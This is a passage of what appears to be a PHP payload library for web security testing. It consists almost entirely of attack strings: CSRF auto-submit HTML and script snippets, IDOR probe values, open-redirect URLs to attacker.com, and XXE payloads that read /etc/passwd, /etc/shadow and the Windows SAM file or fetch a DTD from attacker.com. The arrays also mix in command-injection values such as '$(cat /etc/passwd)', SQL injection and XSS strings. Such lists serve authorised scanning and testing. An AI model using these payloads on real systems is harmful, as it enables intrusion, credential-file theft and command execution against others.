        "<audio src=\"http://target.com/action\" onloadend=\"document.forms[0].submit()\">",
        "<audio src=\"http://target.com/action\" onabort=\"document.forms[0].submit()\">",
        "<audio src=\"http://target.com/action\" onerror=\"document.forms[0].submit()\">",
        "<audio src=\"http://target.com/action\" oncanplay=\"document.forms[0].submit()\">",
        "<audio src=\"http://target.com/action\" oncanplaythrough=\"document.forms[0].submit()\">",
        "<audio src=\"http://target.com/action\" onloadeddata=\"document.forms[0].submit()\">",
        "<audio src=\"http://target.com/action\" onloadedmetadata=\"document.forms[0].submit()\">",
        
        // Video-based CSRF
        "<video src=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
        "<video src=\"http://target.com/action\" onloadstart=\"document.forms[0].submit()\">",
        "<video src=\"http://target.com/action\" onloadend=\"document.forms[0].submit()\">",
        "<video src=\"http://target.com/action\" onabort=\"document.forms[0].submit()\">",
        "<video src=\"http://target.com/action\" onerror=\"document.forms[0].submit()\">",
        "<video src=\"http://target.com/action\" oncanplay=\"document.forms[0].submit()\">",
        "<video src=\"http://target.com/action\" oncanplaythrough=\"document.forms[0].submit()\">",
        "<video src=\"http://target.com/action\" onloadeddata=\"document.forms[0].submit()\">",
        "<video src=\"http://target.com/action\" onloadedmetadata=\"document.forms[0].submit()\">",
        
        // Source-based CSRF
        "<source src=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
        "<source src=\"http://target.com/action\" onloadstart=\"document.forms[0].submit()\">",
        "<source src=\"http://target.com/action\" onloadend=\"document.forms[0].submit()\">",
        "<source src=\"http://target.com/action\" onabort=\"document.forms[0].submit()\">",
        "<source src=\"http://target.com/action\" onerror=\"document.forms[0].submit()\">",
        "<source src=\"http://target.com/action\" oncanplay=\"document.forms[0].submit()\">",
        "<source src=\"http://target.com/action\" oncanplaythrough=\"document.forms[0].submit()\">",
        "<source src=\"http://target.com/action\" onloadeddata=\"document.forms[0].submit()\">",
        "<source src=\"http://target.com/action\" onloadedmetadata=\"document.forms[0].submit()\">",
        
        // Track-based CSRF
        "<track src=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
        "<track src=\"http://target.com/action\" onloadstart=\"document.forms[0].submit()\">",
        "<track src=\"http://target.com/action\" onloadend=\"document.forms[0].submit()\">",
        "<track src=\"http://target.com/action\" onabort=\"document.forms[0].submit()\">",
        "<track src=\"http://target.com/action\" onerror=\"document.forms[0].submit()\">",
        "<track src=\"http://target.com/action\" oncanplay=\"document.forms[0].submit()\">",
        "<track src=\"http://target.com/action\" oncanplaythrough=\"document.forms[0].submit()\">",
        "<track src=\"http://target.com/action\" onloadeddata=\"document.forms[0].submit()\">",
        "<track src=\"http://target.com/action\" onloadedmetadata=\"document.forms[0].submit()\">",
        
        // Area-based CSRF
        "<area href=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
        "<area href=\"http://target.com/action\" onloadstart=\"document.forms[0].submit()\">",
        "<area href=\"http://target.com/action\" onloadend=\"document.forms[0].submit()\">",
        "<area href=\"http://target.com/action\" onabort=\"document.forms[0].submit()\">",
        "<area href=\"http://target.com/action\" onerror=\"document.forms[0].submit()\">",
        "<area href=\"http://target.com/action\" oncanplay=\"document.forms[0].submit()\">",
        "<area href=\"http://target.com/action\" oncanplaythrough=\"document.forms[0].submit()\">",
        "<area href=\"http://target.com/action\" onloadeddata=\"document.forms[0].submit()\">",
        "<area href=\"http://target.com/action\" onloadedmetadata=\"document.forms[0].submit()\">",
        
        // Advanced CSRF techniques
        "<script>setTimeout(function(){document.forms[0].submit();},1000);</script>",
        "<script>setInterval(function(){document.forms[0].submit();},1000);</script>",
        "<script>requestAnimationFrame(function(){document.forms[0].submit();});</script>",
        "<script>requestIdleCallback(function(){document.forms[0].submit();});</script>",
        "<script>Promise.resolve().then(function(){document.forms[0].submit();});</script>",
        "<script>setImmediate(function(){document.forms[0].submit();});</script>",
        "<script>process.nextTick(function(){document.forms[0].submit();});</script>",
        "<script>queueMicrotask(function(){document.forms[0].submit();});</script>",
        
        // Event-based CSRF
        "<script>document.addEventListener('DOMContentLoaded',function(){document.forms[0].submit();});</script>",
        "<script>window.addEventListener('load',function(){document.forms[0].submit();});</script>",
        "<script>window.addEventListener('beforeunload',function(){document.forms[0].submit();});</script>",
        "<script>window.addEventListener('unload',function(){document.forms[0].submit();});</script>",
        "<script>window.addEventListener('focus',function(){document.forms[0].submit();});</script>",
        "<script>window.addEventListener('blur',function(){document.forms[0].submit();});</script>",
        "<script>window.addEventListener('resize',function(){document.forms[0].submit();});</script>",
        "<script>window.addEventListener('scroll',function(){document.forms[0].submit();});</script>",
        "<script>window.addEventListener('online',function(){document.forms[0].submit();});</script>",
        "<script>window.addEventListener('offline',function(){document.forms[0].submit();});</script>",
        
        // Mouse event CSRF
        "<script>document.addEventListener('click',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('dblclick',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('mousedown',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('mouseup',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('mousemove',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('mouseover',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('mouseout',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('mouseenter',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('mouseleave',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('wheel',function(){document.forms[0].submit();});</script>",
        
        // Keyboard event CSRF
        "<script>document.addEventListener('keydown',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('keyup',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('keypress',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('input',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('change',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('submit',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('reset',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('select',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('selectstart',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('selectionchange',function(){document.forms[0].submit();});</script>",
        
        // Touch event CSRF
        "<script>document.addEventListener('touchstart',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('touchend',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('touchmove',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('touchcancel',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('gesturestart',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('gesturechange',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('gestureend',function(){document.forms[0].submit();});</script>",
        
        // Form event CSRF
        "<script>document.addEventListener('focusin',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('focusout',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('invalid',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('search',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('submit',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('reset',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('change',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('input',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('select',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('selectstart',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('selectionchange',function(){document.forms[0].submit();});</script>",
        
        // Media event CSRF
        "<script>document.addEventListener('loadstart',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('progress',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('suspend',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('abort',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('error',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('emptied',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('stalled',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('loadedmetadata',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('loadeddata',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('canplay',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('canplaythrough',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('playing',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('waiting',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('seeking',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('seeked',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('ended',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('durationchange',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('timeupdate',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('play',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('pause',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('ratechange',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('volumechange',function(){document.forms[0].submit();});</script>",
        "<script>document.addEventListener('cuechange',function(){document.forms[0].submit();});</script>"
    ];

    /**
     * IDOR payloads
     */
    public static array $idor = [
        // Numeric IDs
        "1",
        "2",
        "3",
        "4",
        "5",
        "10",
        "100",
        "1000",
        "10000",
        "100000",
        "999999",
        "9999999",
        "99999999",
        "999999999",
        "9999999999",
        "99999999999",
        "999999999999",
        "9999999999999",
        "99999999999999",
        "999999999999999",
        
        // String IDs
        "admin",
        "user",
        "test",
        "demo",
        "guest",
        "anonymous",
        "root",
        "superuser",
        "administrator",
        "moderator",
        "editor",
        "author",
        "contributor",
        "subscriber",
        "member",
        "premium",
        "vip",
        "staff",
        "support",
        "helpdesk",
        
        // Special values
        "null",
        "undefined",
        "true",
        "false",
        "0",
        "-1",
        "-2",
        "-3",
        "-10",
        "-100",
        "-1000",
        "0.1",
        "0.01",
        "0.001",
        "1.1",
        "1.01",
        "1.001",
        "10.1",
        "10.01",
        "10.001",
        
        // UUID variations
        "00000000-0000-0000-0000-000000000000",
        "11111111-1111-1111-1111-111111111111",
        "22222222-2222-2222-2222-222222222222",
        "33333333-3333-3333-3333-333333333333",
        "44444444-4444-4444-4444-444444444444",
        "55555555-5555-5555-5555-555555555555",
        "66666666-6666-6666-6666-666666666666",
        "77777777-7777-7777-7777-777777777777",
        "88888888-8888-8888-8888-888888888888",
        "99999999-9999-9999-9999-999999999999",
        "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
        "bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb",
        "cccccccc-cccc-cccc-cccc-cccccccccccc",
        "dddddddd-dddd-dddd-dddd-dddddddddddd",
        "eeeeeeee-eeee-eeee-eeee-eeeeeeeeeeee",
        "ffffffff-ffff-ffff-ffff-ffffffffffff",
        
        // Hash variations
        "00000000000000000000000000000000",
        "11111111111111111111111111111111",
        "22222222222222222222222222222222",
        "33333333333333333333333333333333",
        "44444444444444444444444444444444",
        "55555555555555555555555555555555",
        "66666666666666666666666666666666",
        "77777777777777777777777777777777",
        "88888888888888888888888888888888",
        "99999999999999999999999999999999",
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
        "cccccccccccccccccccccccccccccccc",
        "dddddddddddddddddddddddddddddddd",
        "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
        "ffffffffffffffffffffffffffffffff",
        
        // Base64 variations
        "YWRtaW4=",
        "dXNlcg==",
        "dGVzdA==",
        "ZGVtbw==",
        "Z3Vlc3Q=",
        "YW5vbnltb3Vz",
        "cm9vdA==",
        "c3VwZXJ1c2Vy",
        "YWRtaW5pc3RyYXRvcg==",
        "bW9kZXJhdG9y",
        "ZWRpdG9y",
        "YXV0aG9y",
        "Y29udHJpYnV0b3I=",
        "c3Vic2NyaWJlcg==",
        "bWVtYmVy",
        "cHJlbWl1bQ==",
        "dmlw",
        "c3RhZmY=",
        "c3VwcG9ydA==",
        "aGVscGRlc2s=",
        
        // URL encoded variations
        "admin%00",
        "user%00",
        "test%00",
        "demo%00",
        "guest%00",
        "anonymous%00",
        "root%00",
        "superuser%00",
        "administrator%00",
        "moderator%00",
        "editor%00",
        "author%00",
        "contributor%00",
        "subscriber%00",
        "member%00",
        "premium%00",
        "vip%00",
        "staff%00",
        "support%00",
        "helpdesk%00",
        
        // Double encoded variations
        "admin%2500",
        "user%2500",
        "test%2500",
        "demo%2500",
        "guest%2500",
        "anonymous%2500",
        "root%2500",
        "superuser%2500",
        "administrator%2500",
        "moderator%2500",
        "editor%2500",
        "author%2500",
        "contributor%2500",
        "subscriber%2500",
        "member%2500",
        "premium%2500",
        "vip%2500",
        "staff%2500",
        "support%2500",
        "helpdesk%2500",
        
        // Special characters
        "admin'",
        "user'",
        "test'",
        "demo'",
        "guest'",
        "anonymous'",
        "root'",
        "superuser'",
        "administrator'",
        "moderator'",
        "editor'",
        "author'",
        "contributor'",
        "subscriber'",
        "member'",
        "premium'",
        "vip'",
        "staff'",
        "support'",
        "helpdesk'",
        
        // SQL injection variations
        "admin'--",
        "user'--",
        "test'--",
        "demo'--",
        "guest'--",
        "anonymous'--",
        "root'--",
        "superuser'--",
        "administrator'--",
        "moderator'--",
        "editor'--",
        "author'--",
        "contributor'--",
        "subscriber'--",
        "member'--",
        "premium'--",
        "vip'--",
        "staff'--",
        "support'--",
        "helpdesk'--",
        
        // XSS variations
        "<script>alert('IDOR')</script>",
        "<img src=x onerror=alert('IDOR')>",
        "<svg onload=alert('IDOR')>",
        "javascript:alert('IDOR')",
        "<iframe src=javascript:alert('IDOR')>",
        "<body onload=alert('IDOR')>",
        "<input onfocus=alert('IDOR') autofocus>",
        "<select onfocus=alert('IDOR') autofocus>",
        "<textarea onfocus=alert('IDOR') autofocus>",
        "<keygen onfocus=alert('IDOR') autofocus>",
        
        // Command injection variations
        "; ls",
        "| ls",
        "& ls",
        "&& ls",
        "|| ls",
        "`ls`",
        "$(ls)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "& cat /etc/passwd",
        "&& cat /etc/passwd",
        "|| cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "; whoami",
        "| whoami",
        "& whoami",
        "&& whoami",
        "|| whoami",
        "`whoami`",
        "$(whoami)"
    ];

    /**
     * Open Redirect payloads
     */
    public static array $openRedirect = [
        // Basic redirects
        "http://attacker.com",
        "https://attacker.com",
        "//attacker.com",
        "//attacker.com/",
        "//attacker.com/path",
        "//attacker.com/path?param=value",
        "//attacker.com/path#fragment",
        
        // JavaScript redirects
        "javascript:alert('redirect')",
        "javascript:void(0)",
        "javascript:void(alert(1))",
        "javascript:void(alert('redirect'))",
        "javascript:void(alert(document.cookie))",
        "javascript:void(alert(document.domain))",
        "javascript:void(alert(document.location))",
        "javascript:void(alert(document.referrer))",
        "javascript:void(alert(document.title))",
        "javascript:void(alert(document.URL))",
        "javascript:void(alert(document.URLUnencoded))",
        "javascript:void(alert(document.baseURI))",
        
        // Data URI redirects
        "data:text/html,<script>alert('redirect')</script>",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html,<script>alert(document.cookie)</script>",
        "data:text/html,<script>alert(document.domain)</script>",
        "data:text/html,<script>alert(document.location)</script>",
        "data:text/html,<script>alert(document.referrer)</script>",
        "data:text/html,<script>alert(document.title)</script>",
        "data:text/html,<script>alert(document.URL)</script>",
        "data:text/html,<script>alert(document.URLUnencoded)</script>",
        "data:text/html,<script>alert(document.baseURI)</script>",
        
        // VBScript redirects
        "vbscript:alert('redirect')",
        "vbscript:alert(1)",
        "vbscript:msgbox('redirect')",
        "vbscript:msgbox(1)",
        "vbscript:msgbox('redirect',0)",
        "vbscript:msgbox('redirect',1)",
        "vbscript:msgbox('redirect',2)",
        "vbscript:msgbox('redirect',3)",
        "vbscript:msgbox('redirect',4)",
        "vbscript:msgbox('redirect',5)",
        
        // File protocol redirects
        "file:///etc/passwd",
        "file:///etc/shadow",
        "file:///etc/hosts",
        "file:///etc/issue",
        "file:///proc/version",
        "file:///proc/self/environ",
        "file:///proc/self/cmdline",
        "file:///proc/self/status",
        "file:///proc/self/fd/0",
        "file:///proc/self/fd/1",
        "file:///proc/self/fd/2",
        "file:///proc/self/fd/3",
        "file:///proc/self/fd/4",
        "file:///proc/self/fd/5",
        "file:///proc/self/fd/6",
        "file:///proc/self/fd/7",
        "file:///proc/self/fd/8",
        "file:///proc/self/fd/9",
        "file:///proc/self/fd/10",
        
        // Windows file protocol
        "file://C:/windows/win.ini",
        "file://C:/windows/system.ini",
        "file://C:/windows/system32/drivers/etc/hosts",
        "file://C:/windows/system32/config/sam",
        "file://C:/windows/system32/config/system",
        "file://C:/windows/system32/config/software",
        "file://C:/windows/system32/config/security",
        "file://C:/windows/system32/config/default",
        
        // Alternative protocols
        "ftp://attacker.com",
        "gopher://attacker.com",
        "dict://attacker.com",
        "ldap://attacker.com",
        "tftp://attacker.com",
        "sftp://attacker.com",
        "scp://attacker.com",
        "ssh://attacker.com",
        "telnet://attacker.com",
        "rlogin://attacker.com",
        "rsh://attacker.com",
        "rexec://attacker.com",
        "finger://attacker.com",
        "whois://attacker.com",
        "nntp://attacker.com",
        "news://attacker.com",
        "irc://attacker.com",
        "ircs://attacker.com",
        "mumble://attacker.com",
        "ts3server://attacker.com",
        "ventrilo://attacker.com",
        
        // Communication protocols
        "mailto:attacker@attacker.com",
        "tel:1234567890",
        "sms:1234567890",
        "whatsapp://send?phone=1234567890",
        "skype:attacker?chat",
        "facetime:attacker@attacker.com",
        "zoommtg://attacker.com",
        "teams://attacker.com",
        "slack://attacker.com",
        "discord://attacker.com",
        "telegram://attacker.com",
        "signal://attacker.com",
        "viber://attacker.com",
        "line://attacker.com",
        "wechat://attacker.com",
        "qq://attacker.com",
        "kik://attacker.com",
        "snapchat://attacker.com",
        "instagram://attacker.com",
        "facebook://attacker.com",
        "twitter://attacker.com",
        
        // Cloud services
        "aws://attacker.com",
        "azure://attacker.com",
        "gcp://attacker.com",
        "digitalocean://attacker.com",
        "heroku://attacker.com",
        "netlify://attacker.com",
        "vercel://attacker.com",
        "cloudflare://attacker.com",
        "fastly://attacker.com",
        "akamai://attacker.com",
        "cloudfront://attacker.com",
        "s3://attacker.com",
        "ec2://attacker.com",
        "lambda://attacker.com",
        "rds://attacker.com",
        "dynamodb://attacker.com",
        "sns://attacker.com",
        "sqs://attacker.com",
        "ses://attacker.com",
        "cognito://attacker.com",
        "iam://attacker.com",
        
        // Development tools
        "vscode://attacker.com",
        "atom://attacker.com",
        "sublime://attacker.com",
        "notepad++://attacker.com",
        "vim://attacker.com",
        "emacs://attacker.com",
        "nano://attacker.com",
        "gedit://attacker.com",
        "kate://attacker.com",
        "geany://attacker.com",
        "bluefish://attacker.com",
        "komodo://attacker.com",
        "eclipse://attacker.com",
        "intellij://attacker.com",
        "netbeans://attacker.com",
        "xcode://attacker.com",
        "android://attacker.com",
        "ios://attacker.com",
        "flutter://attacker.com",
        "react://attacker.com",
        "angular://attacker.com",
        
        // Gaming platforms
        "steam://attacker.com",
        "origin://attacker.com",
        "uplay://attacker.com",
        "epic://attacker.com",
        "battle.net://attacker.com",
        "gog://attacker.com",
        "itch.io://attacker.com",
        "humble://attacker.com",
        "greenmangaming://attacker.com",
        "gamesplanet://attacker.com",
        "fanatical://attacker.com",
        "indiegala://attacker.com",
        "bundle://attacker.com",
        "game://attacker.com",
        "play://attacker.com",
        "start://attacker.com",
        "launch://attacker.com",
        "run://attacker.com",
        "execute://attacker.com",
        "open://attacker.com",
        "load://attacker.com",
        
        // Encoded redirects
        "http://attacker.com%00",
        "https://attacker.com%00",
        "//attacker.com%00",
        "javascript:alert('redirect')%00",
        "data:text/html,<script>alert('redirect')</script>%00",
        "vbscript:alert('redirect')%00",
        "file:///etc/passwd%00",
        "ftp://attacker.com%00",
        "gopher://attacker.com%00",
        "mailto:attacker@attacker.com%00",
        "tel:1234567890%00",
        "sms:1234567890%00",
        "whatsapp://send?phone=1234567890%00",
        "skype:attacker?chat%00",
        "facetime:attacker@attacker.com%00",
        "zoommtg://attacker.com%00",
        "teams://attacker.com%00",
        "slack://attacker.com%00",
        "discord://attacker.com%00",
        "telegram://attacker.com%00",
        
        // Double encoded redirects
        "http://attacker.com%2500",
        "https://attacker.com%2500",
        "//attacker.com%2500",
        "javascript:alert('redirect')%2500",
        "data:text/html,<script>alert('redirect')</script>%2500",
        "vbscript:alert('redirect')%2500",
        "file:///etc/passwd%2500",
        "ftp://attacker.com%2500",
        "gopher://attacker.com%2500",
        "mailto:attacker@attacker.com%2500",
        "tel:1234567890%2500",
        "sms:1234567890%2500",
        "whatsapp://send?phone=1234567890%2500",
        "skype:attacker?chat%2500",
        "facetime:attacker@attacker.com%2500",
        "zoommtg://attacker.com%2500",
        "teams://attacker.com%2500",
        "slack://attacker.com%2500",
        "discord://attacker.com%2500",
        "telegram://attacker.com%2500",
        
        // Special characters
        "http://attacker.com'",
        "https://attacker.com'",
        "//attacker.com'",
        "javascript:alert('redirect')'",
        "data:text/html,<script>alert('redirect')</script>'",
        "vbscript:alert('redirect')'",
        "file:///etc/passwd'",
        "ftp://attacker.com'",
        "gopher://attacker.com'",
        "mailto:attacker@attacker.com'",
        "tel:1234567890'",
        "sms:1234567890'",
        "whatsapp://send?phone=1234567890'",
        "skype:attacker?chat'",
        "facetime:attacker@attacker.com'",
        "zoommtg://attacker.com'",
        "teams://attacker.com'",
        "slack://attacker.com'",
        "discord://attacker.com'",
        "telegram://attacker.com'",
        
        // SQL injection variations
        "http://attacker.com'--",
        "https://attacker.com'--",
        "//attacker.com'--",
        "javascript:alert('redirect')'--",
        "data:text/html,<script>alert('redirect')</script>'--",
        "vbscript:alert('redirect')'--",
        "file:///etc/passwd'--",
        "ftp://attacker.com'--",
        "gopher://attacker.com'--",
        "mailto:attacker@attacker.com'--",
        "tel:1234567890'--",
        "sms:1234567890'--",
        "whatsapp://send?phone=1234567890'--",
        "skype:attacker?chat'--",
        "facetime:attacker@attacker.com'--",
        "zoommtg://attacker.com'--",
        "teams://attacker.com'--",
        "slack://attacker.com'--",
        "discord://attacker.com'--",
        "telegram://attacker.com'--",
        
        // XSS variations
        "<script>alert('redirect')</script>",
        "<img src=x onerror=alert('redirect')>",
        "<svg onload=alert('redirect')>",
        "javascript:alert('redirect')",
        "<iframe src=javascript:alert('redirect')>",
        "<body onload=alert('redirect')>",
        "<input onfocus=alert('redirect') autofocus>",
        "<select onfocus=alert('redirect') autofocus>",
        "<textarea onfocus=alert('redirect') autofocus>",
        "<keygen onfocus=alert('redirect') autofocus>",
        
        // Command injection variations
        "; ls",
        "| ls",
        "& ls",
        "&& ls",
        "|| ls",
        "`ls`",
        "$(ls)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "& cat /etc/passwd",
        "&& cat /etc/passwd",
        "|| cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "; whoami",
        "| whoami",
        "& whoami",
        "&& whoami",
        "|| whoami",
        "`whoami`",
        "$(whoami)"
    ];

    /**
     * XXE payloads
     */
    public static array $xxe = [
        // Basic XXE
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/hosts\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/issue\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///proc/version\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///proc/self/environ\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///proc/self/cmdline\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///proc/self/status\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///proc/self/fd/0\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///proc/self/fd/1\" >]><foo>&xxe;</foo>",
        
        // Windows XXE
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/system.ini\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/system32/config/sam\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/system32/config/system\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/system32/config/software\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/system32/config/security\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/system32/config/default\" >]><foo>&xxe;</foo>",
        
        // HTTP XXE
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"https://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ftp://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"gopher://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"dict://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ldap://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"tftp://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"sftp://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"scp://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"ssh://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>",
        
        // PHP wrapper XXE
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\" >]><foo>&xxe;</foo>",
